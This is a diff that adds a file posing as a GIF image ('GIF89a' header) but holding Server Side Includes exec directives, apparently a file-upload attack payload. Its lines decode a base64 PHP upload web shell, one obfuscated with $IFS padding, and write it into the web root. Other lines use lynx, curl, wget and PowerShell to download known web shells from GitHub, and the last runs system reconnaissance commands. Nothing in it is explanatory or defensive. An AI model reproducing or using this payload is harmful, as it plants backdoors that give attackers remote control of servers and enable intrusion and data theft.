@@ -1,0 +1,15 @@
+GIF89a1
+<!--#echo var="DOCUMENT_ROOT" -->
+<br />
+<!--#echo var="DOCUMENT_URI" -->SSIWORK
+<br />
+<!--#echo var="SERVER_ADDR" -->
+<br />
+<!--#exec cmd="echo PD9waHAgaWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWyIwIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siMCJdWyJuYW1lIl0pKXtlY2hvIlkiO31lbHNle2VjaG8iTiI7fX1lbHNle2VjaG8iPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT0wPjxpbnB1dCBuYW1lPTAgdHlwZT1zdWJtaXQgdmFsdWU9dXA+Ijt9Pz4= | base64 -d | tee ../../kem2.php" -->
+<!--#exec cmd="echo$IFS'PD9waHAgaWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWyIwIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siMCJdWyJuYW1lIl0pKXtlY2hvIlkiO31lbHNle2VjaG8iTiI7fX1lbHNle2VjaG8iPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT0wPjxpbnB1dCBuYW1lPTAgdHlwZT1zdWJtaXQgdmFsdWU9dXA+Ijt9Pz4='$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'tee'$IFS'../../kem.php'" -->
+<!--#exec cmd="lynx$IFS-source$IFS'https://raw.githubusercontent.com/indoxploit-coders/tmp-shell/master/tmp-shell.php$IFS>$IFS'../../'" -->
+<!--#exec cmd="{curl,raw.githubusercontent.com/Naughty-SEC/WebShell/master/Php/b374k-mini-shell-php.php.php,-o,../../4.php}" -->
+<!--#exec cmd="{wget,raw.githubusercontent.com/indoxploit-coders/tmp-shell/master/tmp-shell.php,-O,../../../../../5.php}" -->
+<!--#exec cmd="powershell -Command "(New-Object Net.WebClient).DownloadFile('raw.githubusercontent.com/Naughty-SEC/WebShell/master/Php/b374k-mini-shell-php.php.php,'../../6.php')"" -->
+<br />
+<!--#exec cmd="dir;pwd;{uname,-a}" -->
